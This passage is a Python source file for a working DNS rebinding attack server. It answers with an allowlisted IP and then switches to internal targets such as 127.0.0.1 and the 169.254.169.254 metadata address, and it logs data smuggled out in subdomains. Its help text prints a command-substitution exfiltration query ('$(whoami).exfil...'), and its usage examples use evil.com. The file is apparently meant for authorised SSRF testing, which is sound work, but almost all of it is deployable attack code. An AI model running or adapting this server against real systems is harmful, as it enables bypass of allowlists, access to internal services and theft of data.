#!/usr/bin/env python3
"""
DNS-Rebinder - DNS rebinding attack server with interactive control.

Features:
- Multiple rebind strategies (count, time, round-robin, random, multi-target)
- Live configuration changes
- Subdomain data exfiltration capture
- Structured JSON logging

Based on cujanovic's dns.py for SSRF testing.
https://github.com/cujanovic/SSRF-Testing/blob/master/dns.py
"""

import argparse
import ipaddress
import datetime
import json
import random
import re
import sys
import time
from abc import ABC, abstractmethod
from collections import deque
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Optional

try:
    import yaml
    HAS_YAML = True
except ImportError:
    HAS_YAML = False

CONFIG_FILE = Path("dns-rebinder.yaml")

from twisted.internet import reactor, stdio
from twisted.names import dns, server, hosts as hosts_module, client, resolve, root
from twisted.protocols.basic import LineReceiver
from twisted.python.runtime import platform


# ============================================================================
# Rebind Strategies
# ============================================================================

class StrategyType(Enum):
    COUNT = "count"
    TIME = "time"
    ROUND_ROBIN = "round-robin"
    RANDOM = "random"
    MULTI_TARGET = "multi-target"


class RebindStrategy(ABC):
    """Base class for rebind strategies."""
    
    @abstractmethod
    def get_ip(self, hostname: str, whitelist_ip: str, rebind_ips: list[str], 
               query_count: int, first_seen: float) -> str:
        """Determine which IP to return."""
        pass
    
    @abstractmethod
    def describe(self) -> str:
        """Human-readable description."""
        pass


class CountStrategy(RebindStrategy):
    """Rebind after N queries."""
    
    def __init__(self, threshold: int = 1):
        self.threshold = threshold
    
    def get_ip(self, hostname: str, whitelist_ip: str, rebind_ips: list[str],
               query_count: int, first_seen: float) -> str:
        if query_count < self.threshold:
            return whitelist_ip
        return rebind_ips[0]
    
    def describe(self) -> str:
        return f"count (rebind after {self.threshold} queries)"


class TimeStrategy(RebindStrategy):
    """Rebind after N seconds from first query."""
    
    def __init__(self, delay_seconds: float = 5.0):
        self.delay_seconds = delay_seconds
    
    def get_ip(self, hostname: str, whitelist_ip: str, rebind_ips: list[str],
               query_count: int, first_seen: float) -> str:
        elapsed = time.time() - first_seen
        if elapsed < self.delay_seconds:
            return whitelist_ip
        return rebind_ips[0]
    
    def describe(self) -> str:
        return f"time (rebind after {self.delay_seconds}s)"


class RoundRobinStrategy(RebindStrategy):
    """Alternate between whitelist and rebind IPs."""
    
    def __init__(self):
        pass
    
    def get_ip(self, hostname: str, whitelist_ip: str, rebind_ips: list[str],
               query_count: int, first_seen: float) -> str:
        if query_count % 2 == 0:
            return whitelist_ip
        return rebind_ips[0]
    
    def describe(self) -> str:
        return "round-robin (alternate whitelist/rebind)"


class RandomStrategy(RebindStrategy):
    """Probabilistic rebinding."""
    
    def __init__(self, rebind_probability: float = 0.5):
        self.rebind_probability = rebind_probability
    
    def get_ip(self, hostname: str, whitelist_ip: str, rebind_ips: list[str],
               query_count: int, first_seen: float) -> str:
        # First query always whitelist (need at least one to pass validation)
        if query_count == 0:
            return whitelist_ip
        if random.random() < self.rebind_probability:
            return rebind_ips[0]
        return whitelist_ip
    
    def describe(self) -> str:
        return f"random ({int(self.rebind_probability * 100)}% rebind chance)"


class MultiTargetStrategy(RebindStrategy):
    """Cycle through multiple rebind targets."""
    
    def __init__(self, threshold: int = 1):
        self.threshold = threshold  # Whitelist queries before cycling
    
    def get_ip(self, hostname: str, whitelist_ip: str, rebind_ips: list[str],
               query_count: int, first_seen: float) -> str:
        if query_count < self.threshold:
            return whitelist_ip
        # Cycle through rebind IPs
        idx = (query_count - self.threshold) % len(rebind_ips)
        return rebind_ips[idx]
    
    def describe(self) -> str:
        return f"multi-target (cycle rebind IPs after {self.threshold} queries)"


def create_strategy(strategy_type: StrategyType, **kwargs) -> RebindStrategy:
    """Factory for creating strategies."""
    if strategy_type == StrategyType.COUNT:
        return CountStrategy(threshold=kwargs.get('threshold', 1))
    elif strategy_type == StrategyType.TIME:
        return TimeStrategy(delay_seconds=kwargs.get('delay', 5.0))
    elif strategy_type == StrategyType.ROUND_ROBIN:
        return RoundRobinStrategy()
    elif strategy_type == StrategyType.RANDOM:
        return RandomStrategy(rebind_probability=kwargs.get('probability', 0.5))
    elif strategy_type == StrategyType.MULTI_TARGET:
        return MultiTargetStrategy(threshold=kwargs.get('threshold', 1))
    else:
        raise ValueError(f"Unknown strategy: {strategy_type}")


# ============================================================================
# Logging
# ============================================================================

class Logger:
    """Structured logging with JSON support."""
    
    def __init__(self, log_dir: Path = Path(".")):
        self.log_dir = log_dir
        self.log_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
        self.main_log = self.log_dir / f"dns-rebind-{timestamp}.log"
        self.json_log = self.log_dir / f"dns-rebind-{timestamp}.json"
        self.exfil_log = self.log_dir / f"dns-exfil-{timestamp}.log"
        
        # Write JSON array start
        with open(self.json_log, 'w') as f:
            f.write('[\n')
        self._json_first = True
    
    def _timestamp(self) -> str:
        return datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
    
    def _write_json(self, entry: dict):
        """Append JSON entry."""
        with open(self.json_log, 'a') as f:
            prefix = '' if self._json_first else ',\n'
            self._json_first = False
            f.write(prefix + json.dumps(entry))
    
    def info(self, message: str, to_stdout: bool = True):
        """Log info message."""
        line = f"[{self._timestamp()}] {message}"
        if to_stdout:
            print(line)
        with open(self.main_log, 'a') as f:
            f.write(line + '\n')
    
    def query(self, hostname: str, response_ip: str, source_ip: str, 
              source_port: int, query_type: str, is_rebind: bool,
              query_count: int, strategy: str):
        """Log DNS query with full details."""
        now = datetime.datetime.now()
        
        # Console output (colorized)
        status = "→ REBIND" if is_rebind else "→ whitelist"
        color = "\033[91m" if is_rebind else "\033[92m"
        reset = "\033[0m"
        
        print(f"[{self._timestamp()}] {color}{query_type:4}{reset} {hostname}")
        print(f"             {color}{status:12}{reset} {response_ip} (query #{query_count + 1})")
        print(f"             from {source_ip}:{source_port}")
        
        # Main log (plain text)
        with open(self.main_log, 'a') as f:
            f.write(f"[{self._timestamp()}] {query_type} {hostname} -> {response_ip} "
                   f"({'REBIND' if is_rebind else 'whitelist'}) from {source_ip}:{source_port}\n")
        
        # JSON log (structured)
        entry = {
            "timestamp": now.isoformat(),
            "type": "query",
            "query_type": query_type,
            "hostname": hostname,
            "response_ip": response_ip,
            "source_ip": source_ip,
            "source_port": source_port,
            "is_rebind": is_rebind,
            "query_count": query_count + 1,
            "strategy": strategy
        }
        self._write_json(entry)
    
    def exfil(self, full_hostname: str, extracted_data: str, source_ip: str):
        """Log exfiltrated subdomain data."""
        now = datetime.datetime.now()
        
        # Console (highlighted)
        print(f"\033[95m[{self._timestamp()}] EXFIL\033[0m {extracted_data}")
        print(f"             from {full_hostname} ({source_ip})")
        
        # Exfil-specific log
        with open(self.exfil_log, 'a') as f:
            f.write(f"[{now.isoformat()}] {extracted_data}\n")
            f.write(f"  hostname: {full_hostname}\n")
            f.write(f"  source: {source_ip}\n\n")
        
        # JSON log
        entry = {
            "timestamp": now.isoformat(),
            "type": "exfil",
            "hostname": full_hostname,
            "data": extracted_data,
            "source_ip": source_ip
        }
        self._write_json(entry)
    
    def config_change(self, setting: str, old_value: str, new_value: str):
        """Log configuration change."""
        self.info(f"CONFIG: {setting}: {old_value} -> {new_value}")
        entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "type": "config_change",
            "setting": setting,
            "old_value": old_value,
            "new_value": new_value
        }
        self._write_json(entry)
    
    def close(self):
        """Close JSON array."""
        with open(self.json_log, 'a') as f:
            f.write('\n]\n')


# ============================================================================
# Server Configuration
# ============================================================================

@dataclass 
class HostState:
    """Per-hostname tracking state."""
    query_count: int = 0
    first_seen: float = field(default_factory=time.time)
    last_response: str = ""


@dataclass
class ServerConfig:
    """Server configuration and state."""
    whitelist_ip: str
    rebind_ips: list[str]
    server_ip: str
    port: int
    domain: str
    ttl: int = 0
    strategy: RebindStrategy = field(default_factory=lambda: CountStrategy(1))
    
    # Exfiltration settings
    exfil_prefix: str = "exfil"  # e.g., data.exfil.evil.com
    
    # Ranges to filter from logs (noisy resolvers)
    quiet_ranges: list = field(default_factory=lambda: [
        '172.253.0.0/16',
        '172.217.0.0/16'
    ])
    
    # State tracking
    host_states: dict[str, HostState] = field(default_factory=dict)
    recent_queries: deque = field(default_factory=lambda: deque(maxlen=100))
    
    # Stats
    total_queries: int = 0
    total_rebinds: int = 0
    total_exfils: int = 0
    
    # Logger
    logger: Optional[Logger] = None
    
    def __post_init__(self):
        self.logger = Logger()
    
    @property
    def ns_prefixes(self) -> list:
        """Nameserver prefixes that shouldn't be rebound."""
        return [f"ns1.{self.domain}", f"ns2.{self.domain}"]
    
    def get_host_state(self, hostname: str) -> HostState:
        """Get or create state for hostname."""
        if hostname not in self.host_states:
            self.host_states[hostname] = HostState()
        return self.host_states[hostname]
    
    def check_exfil(self, hostname: str, source_ip: str) -> Optional[str]:
        """Check if hostname contains exfil data. Returns extracted data or None."""
        # Match: *.exfil.domain.com or *.exfil.subdomain.domain.com
        pattern = rf'^(.+)\.{re.escape(self.exfil_prefix)}\..*{re.escape(self.domain)}$'
        match = re.match(pattern, hostname, re.IGNORECASE)
        if match:
            data = match.group(1)
            self.total_exfils += 1
            self.logger.exfil(hostname, data, source_ip)
            return data
        return None
    
    def get_response_ip(self, hostname: str, source_ip: str = "unknown", 
                        source_port: int = 0) -> str:
        """Determine which IP to return for a hostname."""
        hostname_lower = hostname.lower().rstrip('.')
        
        # NS records always point to server
        for prefix in self.ns_prefixes:
            if hostname_lower.startswith(prefix.lower()):
                return self.server_ip
        
        # Check for exfil data
        self.check_exfil(hostname_lower, source_ip)
        
        # Get/update host state
        state = self.get_host_state(hostname_lower)
        
        # DEBUG: Print state before strategy decision
        print(f"  DEBUG: {hostname_lower} query_count={state.query_count}")
        
        # Determine response IP using strategy
        response_ip = self.strategy.get_ip(
            hostname_lower,
            self.whitelist_ip,
            self.rebind_ips,
            state.query_count,
            state.first_seen
        )
        
        is_rebind = response_ip in self.rebind_ips
        
        # Log the query
        self.logger.query(
            hostname=hostname,
            response_ip=response_ip,
            source_ip=source_ip,
            source_port=source_port,
            query_type="A",
            is_rebind=is_rebind,
            query_count=state.query_count,
            strategy=self.strategy.describe()
        )
        
        # Update state
        state.query_count += 1
        state.last_response = response_ip
        self.total_queries += 1
        if is_rebind:
            self.total_rebinds += 1
        
        # Record for recent queries
        self.recent_queries.append({
            'time': datetime.datetime.now().isoformat(),
            'hostname': hostname,
            'response': response_ip,
            'source': source_ip,
            'is_rebind': is_rebind
        })
        
        return response_ip
    
    def is_quiet_ip(self, ip: str) -> bool:
        """Check if IP should be filtered from logs."""
        try:
            addr = ipaddress.ip_address(ip)
            return any(
                addr in ipaddress.ip_network(net) 
                for net in self.quiet_ranges
            )
        except ValueError:
            return False
    
    def reset_host(self, hostname: Optional[str] = None):
        """Reset state for hostname or all."""
        if hostname:
            self.host_states.pop(hostname.lower(), None)
        else:
            self.host_states.clear()


# Global config instance (set in main)
config: Optional[ServerConfig] = None

# Global source tracking (simpler than passing dicts through Twisted)
_last_dns_source = {'ip': 'unknown', 'port': 0}


# ============================================================================
# Command Interface
# ============================================================================

class CommandProtocol(LineReceiver):
    """Interactive command interface."""
    
    delimiter = b'\n'
    
    COMMANDS = {
        'help': 'Show available commands',
        'status': 'Show current configuration and stats',
        'set whitelist <ip>': 'Change whitelist IP',
        'set rebind <ip>[,ip2,...]': 'Change rebind IP(s)', 
        'set strategy <name> [opts]': 'Change strategy (count/time/round-robin/random/multi-target)',
        'set exfil <prefix>': 'Change exfil subdomain prefix',
        'reset [hostname]': 'Reset query state (all or specific host)',
        'hosts': 'Show all tracked hostnames',
        'log [n]': 'Show recent queries (default: 20)',
        'exfil': 'Show exfiltrated data summary',
        'quit': 'Stop the server',
    }
    
    def connectionMade(self):
        self.transport.write(b'\n')
        self.transport.write(b'> ')
    
    def lineReceived(self, line: bytes):
        line = line.decode('utf-8', errors='ignore').strip()
        
        if not line:
            self.transport.write(b'> ')
            return
        
        parts = line.split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        try:
            if cmd == 'help':
                self.cmd_help()
            elif cmd == 'status':
                self.cmd_status()
            elif cmd == 'set':
                self.cmd_set(args)
            elif cmd == 'reset':
                self.cmd_reset(args)
            elif cmd == 'hosts':
                self.cmd_hosts()
            elif cmd == 'log':
                self.cmd_log(args)
            elif cmd == 'exfil':
                self.cmd_exfil()
            elif cmd in ('quit', 'exit', 'q'):
                self.cmd_quit()
            else:
                self.send(f'Unknown command: {cmd}. Type "help" for commands.')
        except Exception as e:
            self.send(f'Error: {e}')
        
        self.transport.write(b'> ')
    
    def send(self, msg: str):
        self.transport.write(f'{msg}\n'.encode())
    
    def cmd_help(self):
        self.send('\nAvailable commands:')
        for cmd, desc in self.COMMANDS.items():
            self.send(f'  {cmd:30} {desc}')
        self.send('')
        self.send('Strategy examples:')
        self.send('  set strategy count 2         Rebind after 2 queries')
        self.send('  set strategy time 5          Rebind after 5 seconds')
        self.send('  set strategy round-robin     Alternate whitelist/rebind')
        self.send('  set strategy random 0.3      30% rebind probability')
        self.send('  set strategy multi-target 1  Cycle rebind IPs after 1 query')
        self.send('')
    
    def cmd_status(self):
        self.send('\n' + '═' * 60)
        self.send('  DNS-Rebinder Status')
        self.send('═' * 60)
        self.send(f'  Whitelist IP:    {config.whitelist_ip}')
        self.send(f'  Rebind IPs:      {", ".join(config.rebind_ips)}')
        self.send(f'  Server IP:       {config.server_ip}')
        self.send(f'  Domain:          {config.domain}')
        self.send(f'  Port:            {config.port}')
        self.send(f'  TTL:             {config.ttl}')
        self.send(f'  Strategy:        {config.strategy.describe()}')
        self.send(f'  Exfil prefix:    {config.exfil_prefix}.{config.domain}')
        self.send('─' * 60)
        self.send(f'  Total queries:   {config.total_queries}')
        self.send(f'  Total rebinds:   {config.total_rebinds}')
        self.send(f'  Total exfils:    {config.total_exfils}')
        self.send(f'  Tracked hosts:   {len(config.host_states)}')
        self.send('─' * 60)
        self.send(f'  Main log:        {config.logger.main_log}')
        self.send(f'  JSON log:        {config.logger.json_log}')
        self.send(f'  Exfil log:       {config.logger.exfil_log}')
        self.send('═' * 60 + '\n')
    
    def cmd_set(self, args: list):
        if len(args) < 2:
            self.send('Usage: set <whitelist|rebind|strategy|exfil> <value>')
            return
        
        key = args[0].lower()
        
        if key == 'whitelist':
            self._validate_ip(args[1])
            old = config.whitelist_ip
            config.whitelist_ip = args[1]
            config.logger.config_change('whitelist_ip', old, args[1])
            self.send(f'Whitelist IP: {old} -> {args[1]}')
            
        elif key == 'rebind':
            ips = [ip.strip() for ip in args[1].split(',')]
            for ip in ips:
                self._validate_ip(ip)
            old = config.rebind_ips
            config.rebind_ips = ips
            config.logger.config_change('rebind_ips', ','.join(old), ','.join(ips))
            self.send(f'Rebind IPs: {old} -> {ips}')
            
        elif key == 'strategy':
            strategy_name = args[1].lower()
            try:
                strategy_type = StrategyType(strategy_name)
            except ValueError:
                self.send(f'Unknown strategy: {strategy_name}')
                self.send('Available: count, time, round-robin, random, multi-target')
                return
            
            kwargs = {}
            if len(args) > 2:
                if strategy_type == StrategyType.COUNT:
                    kwargs['threshold'] = int(args[2])
                elif strategy_type == StrategyType.TIME:
                    kwargs['delay'] = float(args[2])
                elif strategy_type == StrategyType.RANDOM:
                    kwargs['probability'] = float(args[2])
                elif strategy_type == StrategyType.MULTI_TARGET:
                    kwargs['threshold'] = int(args[2])
            
            old_desc = config.strategy.describe()
            config.strategy = create_strategy(strategy_type, **kwargs)
            config.logger.config_change('strategy', old_desc, config.strategy.describe())
            self.send(f'Strategy: {old_desc} -> {config.strategy.describe()}')
            
        elif key == 'exfil':
            old = config.exfil_prefix
            config.exfil_prefix = args[1]
            config.logger.config_change('exfil_prefix', old, args[1])
            self.send(f'Exfil prefix: {old} -> {args[1]}')
            self.send(f'Exfil domain: *.{args[1]}.{config.domain}')
            
        else:
            self.send(f'Unknown setting: {key}')
    
    def cmd_reset(self, args: list):
        if args:
            hostname = args[0]
            if hostname.lower() in config.host_states:
                config.reset_host(hostname)
                self.send(f'Reset state for: {hostname}')
            else:
                self.send(f'Host not found: {hostname}')
        else:
            count = len(config.host_states)
            config.reset_host()
            self.send(f'Reset all host states ({count} hosts)')
    
    def cmd_hosts(self):
        if not config.host_states:
            self.send('No hosts tracked yet.')
            return
        
        self.send(f'\nTracked hosts ({len(config.host_states)}):')
        self.send('─' * 70)
        self.send(f'  {"Hostname":40} {"Queries":>8} {"Last Response":>18}')
        self.send('─' * 70)
        
        for hostname, state in sorted(config.host_states.items()):
            is_rebind = state.last_response in config.rebind_ips
            status = "REBIND" if is_rebind else "whitelist"
            self.send(f'  {hostname:40} {state.query_count:>8} {state.last_response:>15} ({status})')
        self.send('')
    
    def cmd_log(self, args: list):
        n = int(args[0]) if args else 20
        queries = list(config.recent_queries)[-n:]
        
        if not queries:
            self.send('No queries recorded yet.')
            return
        
        self.send(f'\nRecent queries ({len(queries)}):')
        self.send('─' * 80)
        for q in queries:
            status = "REBIND" if q['is_rebind'] else "whitelist"
            self.send(f"  {q['time'][:19]}  {q['hostname']:35} -> {q['response']:15} ({status})")
        self.send('')
    
    def cmd_exfil(self):
        self.send(f'\nExfiltration Summary')
        self.send('─' * 60)
        self.send(f'  Exfil prefix: *.{config.exfil_prefix}.{config.domain}')
        self.send(f'  Total exfils: {config.total_exfils}')
        self.send(f'  Exfil log:    {config.logger.exfil_log}')
        self.send('')
        self.send('  To exfiltrate data, make DNS queries like:')
        self.send(f'    secret-data.{config.exfil_prefix}.{config.domain}')
        self.send(f'    $(whoami).{config.exfil_prefix}.{config.domain}')
        self.send('')
    
    def cmd_quit(self):
        self.send('Shutting down...')
        config.logger.info('Server stopped by user')
        config.logger.close()
        reactor.stop()
    
    def _validate_ip(self, ip: str):
        """Validate IP address format."""
        ipaddress.ip_address(ip)


# ============================================================================
# DNS Server Components
# ============================================================================

class RebindResolver(hosts_module.Resolver):
    """Custom resolver that implements rebinding logic."""
    
    def __init__(self, *args, source_tracker=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.source_tracker = source_tracker or {}
    
    def _aRecords(self, name: bytes):
        hostname = name.decode('utf-8')
        
        # Get source IP from tracker (set by protocol handlers)
        source_info = self.source_tracker.get('current')
        if not source_info or source_info[0] == 'unknown':
            source_info = self.source_tracker.get('last_udp')
        if not source_info or source_info[0] == 'unknown':
            # Fallback to global tracker
            source_info = (_last_dns_source['ip'], _last_dns_source['port'])
        response_ip = config.get_response_ip(hostname, source_info[0], source_info[1])
        
        return tuple([
            dns.RRHeader(
                name, dns.A, dns.IN, config.ttl,
                dns.Record_A(response_ip, config.ttl)
            )
        ])


class LoggingDNSServerFactory(server.DNSServerFactory):
    """DNS server factory with request logging."""
    
    def __init__(self, *args, source_tracker=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.source_tracker = source_tracker or {}
    
    def buildProtocol(self, addr):
        self.source_tracker['current'] = (addr.host, addr.port)
        return super().buildProtocol(addr)


class LoggingDNSDatagramProtocol(dns.DNSDatagramProtocol):
    """DNS datagram protocol with request logging."""
    
    def __init__(self, *args, source_tracker=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.source_tracker = source_tracker or {}
    
    def datagramReceived(self, datagram, addr):
        global _last_dns_source
        # Store source before processing (both in tracker and global)
        self.source_tracker['current'] = (addr[0], addr[1])
        self.source_tracker['last_udp'] = (addr[0], addr[1])
        _last_dns_source = {'ip': addr[0], 'port': addr[1]}
        return super().datagramReceived(datagram, addr)


def create_resolver(source_tracker: dict):
    """Create the resolver chain."""
    if platform.getType() == 'posix':
        hosts_file = b'/etc/hosts'
        resolv_conf = b'/etc/resolv.conf'
        upstream = client.Resolver(resolv_conf, servers=[('8.8.8.8', 53)])
    else:
        hosts_file = r'c:\windows\hosts'
        bootstrap = client._ThreadedResolverImpl(reactor)
        upstream = root.bootstrap(bootstrap, resolverFactory=client.Resolver)
    
    rebind_resolver = RebindResolver(hosts_file, source_tracker=source_tracker)
    # No caching - rebinding requires fresh lookups every time
    return resolve.ResolverChain([rebind_resolver, upstream])


# ============================================================================
# Setup and Main
# ============================================================================

def print_banner():
    """Print startup banner."""
    print('''
\033[96m╔═══════════════════════════════════════════════════════════════════╗
║                        DNS-Rebinder                               ║
║                   DNS Rebinding Attack Server                     ║
╚═══════════════════════════════════════════════════════════════════╝\033[0m
''')
    print(f'  Whitelist IP:    {config.whitelist_ip}')
    print(f'  Rebind IPs:      {", ".join(config.rebind_ips)}')
    print(f'  Server IP:       {config.server_ip}')
    print(f'  Domain:          {config.domain}')
    print(f'  DNS server:      0.0.0.0:{config.port}')
    print(f'  Strategy:        {config.strategy.describe()}')
    print(f'  Exfil domain:    *.{config.exfil_prefix}.{config.domain}')
    print()
    print(f'  Main log:        {config.logger.main_log}')
    print(f'  JSON log:        {config.logger.json_log}')
    print(f'  Exfil log:       {config.logger.exfil_log}')
    print()
    print('─' * 67)
    print('  Type "help" for commands.')
    print('─' * 67)
    print()


def get_external_ip() -> Optional[str]:
    """Try to detect external IP."""
    import urllib.request
    services = [
        'https://api.ipify.org',
        'https://ifconfig.me/ip',
        'https://icanhazip.com',
    ]
    for url in services:
        try:
            with urllib.request.urlopen(url, timeout=3) as r:
                return r.read().decode().strip()
        except Exception:
            continue
    return None


def validate_ip(ip: str) -> bool:
    """Check if string is valid IP."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def load_config(config_path: Path) -> Optional[dict]:
    """Load configuration from YAML file."""
    if not config_path.exists():
        return None
    
    if not HAS_YAML:
        print(f"⚠️  Config file found but PyYAML not installed. Run: pip install pyyaml")
        return None
    
    try:
        with open(config_path) as f:
            return yaml.safe_load(f)
    except Exception as e:
        print(f"⚠️  Error loading config: {e}")
        return None


def save_config(config_path: Path, config: dict):
    """Save configuration to YAML file."""
    if not HAS_YAML:
        print(f"⚠️  Cannot save config - PyYAML not installed. Run: pip install pyyaml")
        return False
    
    try:
        with open(config_path, 'w') as f:
            yaml.dump(config, f, default_flow_style=False, sort_keys=False)
        return True
    except Exception as e:
        print(f"⚠️  Error saving config: {e}")
        return False


def prompt(text: str, default: Optional[str] = None, validator=None) -> str:
    """Prompt for input with optional default and validation."""
    while True:
        if default:
            user_input = input(f"  {text} [{default}]: ").strip()
            if not user_input:
                user_input = default
        else:
            user_input = input(f"  {text}: ").strip()
        
        if not user_input:
            print("    ⚠ Required field")
            continue
            
        if validator and not validator(user_input):
            print("    ⚠ Invalid format")
            continue
        
        return user_input


def run_setup_wizard() -> argparse.Namespace:
    """Interactive setup wizard."""
    print('''
\033[96m╔═══════════════════════════════════════════════════════════════════╗
║                   DNS-Rebinder Setup Wizard                       ║
╚═══════════════════════════════════════════════════════════════════╝\033[0m
''')
    
    print("  Detecting external IP...", end=" ", flush=True)
    external_ip = get_external_ip()
    if external_ip:
        print(f"found {external_ip}")
    else:
        print("could not detect")
    
    print()
    print("─" * 67)
    print("  Enter configuration values (press Enter for defaults)")
    print("─" * 67)
    print()
    
    args = argparse.Namespace()
    
    print("  \033[1mWhitelist IP\033[0m: The IP the target application trusts/allows")
    args.whitelist = prompt("Whitelist IP", validator=validate_ip)
    print()
    
    print("  \033[1mRebind IPs\033[0m: Target IPs after rebinding (comma-separated)")
    print("  Examples: 127.0.0.1 or 127.0.0.1,169.254.169.254,10.0.0.1")
    rebind_str = prompt("Rebind IPs", default="127.0.0.1")
    args.rebind = [ip.strip() for ip in rebind_str.split(',')]
    for ip in args.rebind:
        if not validate_ip(ip):
            print(f"    ⚠ Invalid IP: {ip}")
            sys.exit(1)
    print()
    
    print("  \033[1mServer IP\033[0m: This machine's public IP (for NS records)")
    args.server = prompt("Server IP", default=external_ip, validator=validate_ip)
    print()
    
    print("  \033[1mDomain\033[0m: Your domain with NS records pointing here")
    args.domain = prompt("Domain")
    print()
    
    print("  \033[1mPort\033[0m: DNS port (requires root for 53)")
    args.port = int(prompt("Port", default="53"))
    print()
    
    print("  \033[1mStrategy\033[0m: When to rebind")
    print("    1. count N      - Rebind after N queries (default)")
    print("    2. time N       - Rebind after N seconds")
    print("    3. round-robin  - Alternate whitelist/rebind")
    print("    4. random N     - N probability of rebind (0.0-1.0)")
    print("    5. multi-target - Cycle through rebind IPs")
    strategy_input = prompt("Strategy", default="count 1")
    
    parts = strategy_input.split()
    strategy_name = parts[0].lower()
    try:
        strategy_type = StrategyType(strategy_name)
    except ValueError:
        print(f"    ⚠ Unknown strategy, using count")
        strategy_type = StrategyType.COUNT
    
    kwargs = {}
    if len(parts) > 1:
        if strategy_type in (StrategyType.COUNT, StrategyType.MULTI_TARGET):
            kwargs['threshold'] = int(parts[1])
        elif strategy_type == StrategyType.TIME:
            kwargs['delay'] = float(parts[1])
        elif strategy_type == StrategyType.RANDOM:
            kwargs['probability'] = float(parts[1])
    
    args.strategy = create_strategy(strategy_type, **kwargs)
    print()
    
    print("  \033[1mExfil prefix\033[0m: Subdomain prefix for data exfiltration")
    print(f"  Queries to *.PREFIX.{args.domain} will be captured")
    args.exfil_prefix = prompt("Exfil prefix", default="exfil")
    print()
    
    args.ttl = 0  # Always 0 for rebinding
    
    print("─" * 67)
    print("  \033[1mConfiguration Summary:\033[0m")
    print("─" * 67)
    print(f"    Whitelist IP:  {args.whitelist}")
    print(f"    Rebind IPs:    {', '.join(args.rebind)}")
    print(f"    Server IP:     {args.server}")
    print(f"    Domain:        {args.domain}")
    print(f"    DNS port:      {args.port}")
    print(f"    Strategy:      {args.strategy.describe()}")
    print(f"    Exfil domain:  *.{args.exfil_prefix}.{args.domain}")
    print()
    
    # Build CLI command for reuse
    strategy_desc = args.strategy.describe()
    if "count" in strategy_desc:
        threshold = strategy_desc.split("after ")[1].split(" ")[0]
        strategy_cli = f"count {threshold}"
    elif "time" in strategy_desc:
        delay = strategy_desc.split("after ")[1].split("s")[0]
        strategy_cli = f"time {delay}"
    elif "round-robin" in strategy_desc:
        strategy_cli = "round-robin"
    elif "random" in strategy_desc:
        prob = strategy_desc.split("(")[1].split("%")[0]
        strategy_cli = f"random {float(prob)/100}"
    elif "multi-target" in strategy_desc:
        threshold = strategy_desc.split("after ")[1].split(" ")[0]
        strategy_cli = f"multi-target {threshold}"
    else:
        strategy_cli = "count 1"
    
    # Build full CLI command (only essential options)
    cli_cmd = f"""sudo python3 dns-rebinder.py \\
    -w {args.whitelist} \\
    -r {','.join(args.rebind)} \\
    -s {args.server} \\
    -d {args.domain} \\
    -p {args.port} \\
    --strategy {strategy_cli} \\
    --exfil-prefix {args.exfil_prefix}"""
    
    # Also create a one-liner version
    cli_oneliner = f"sudo python3 dns-rebinder.py -w {args.whitelist} -r {','.join(args.rebind)} -s {args.server} -d {args.domain} -p {args.port} --strategy {strategy_cli} --exfil-prefix {args.exfil_prefix}"
    
    # Ask to save config file
    print()
    save_conf = input("  Save config file for future use? [Y/n]: ").strip().lower()
    if not save_conf or save_conf in ('y', 'yes'):
        config_data = {
            'whitelist': args.whitelist,
            'rebind': args.rebind,
            'server': args.server,
            'domain': args.domain,
            'port': args.port,
            'strategy': strategy_cli,
            'exfil_prefix': args.exfil_prefix,
        }
        if save_config(CONFIG_FILE, config_data):
            print(f"  ✅ Config saved to {CONFIG_FILE}")
            print(f"     Next time just run: \033[96msudo python3 dns-rebinder.py\033[0m")
        print()
    else:
        # Show CLI equivalent if not saving config
        print()
        print("  \033[1mCLI equivalent (for reuse):\033[0m")
        print(f"\033[96m{cli_cmd}\033[0m")
        print()
        print("  \033[1mOne-liner:\033[0m")
        print(f"  \033[96m{cli_oneliner}\033[0m")
        print()
    
    confirm = input("  Start server? [Y/n]: ").strip().lower()
    if confirm and confirm not in ('y', 'yes'):
        print("\n  Aborted.")
        sys.exit(0)
    
    print()
    return args


def parse_args():
    """Parse command line arguments or run setup wizard."""
    parser = argparse.ArgumentParser(
        description='DNS rebinding attack server',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s                              Interactive setup wizard
  %(prog)s -w 8.8.8.8 -r 127.0.0.1 -s 1.2.3.4 -d evil.com
  %(prog)s -w 8.8.8.8 -r 127.0.0.1,10.0.0.1 -s 1.2.3.4 -d evil.com --strategy multi-target

Strategies:
  --strategy count 2          Rebind after 2 queries
  --strategy time 5           Rebind after 5 seconds
  --strategy round-robin      Alternate whitelist/rebind
  --strategy random 0.3       30%% rebind probability
  --strategy multi-target 1   Cycle rebind IPs after 1 query
        '''
    )
    
    parser.add_argument('positional', nargs='*', help=argparse.SUPPRESS)
    parser.add_argument('--config', '-c', type=Path, default=CONFIG_FILE,
                        help=f'Config file path (default: {CONFIG_FILE})')
    parser.add_argument('--whitelist', '-w', help='Whitelisted IP (passes allowlist)')
    parser.add_argument('--rebind', '-r', help='Rebind IP(s), comma-separated')
    parser.add_argument('--server', '-s', help='This server\'s IP')
    parser.add_argument('--port', '-p', type=int, default=53, help='DNS port (default: 53)')
    parser.add_argument('--domain', '-d', help='Your domain')
    parser.add_argument('--strategy', nargs='+', default=['count', '1'],
                        help='Rebind strategy and options')
    parser.add_argument('--exfil-prefix', default='exfil', help='Exfil subdomain prefix')
    parser.add_argument('--ttl', type=int, default=0, help='DNS TTL (default: 0)')
    
    args = parser.parse_args()
    
    # Handle legacy positional arguments
    if args.positional and len(args.positional) == 5:
        args.whitelist = args.positional[0]
        args.rebind = args.positional[1]
        args.server = args.positional[2]
        args.port = int(args.positional[3])
        args.domain = args.positional[4]
    
    # No args? Check for config file, then wizard
    has_args = args.whitelist or args.rebind or args.server or args.domain or args.positional
    config_path = args.config if args.config else CONFIG_FILE
    if not has_args:
        # Try loading config file
        cfg = load_config(config_path)
        if cfg:
            print(f"📁 Loading config from {CONFIG_FILE}")
            args.whitelist = cfg.get('whitelist')
            args.rebind = cfg.get('rebind', [])
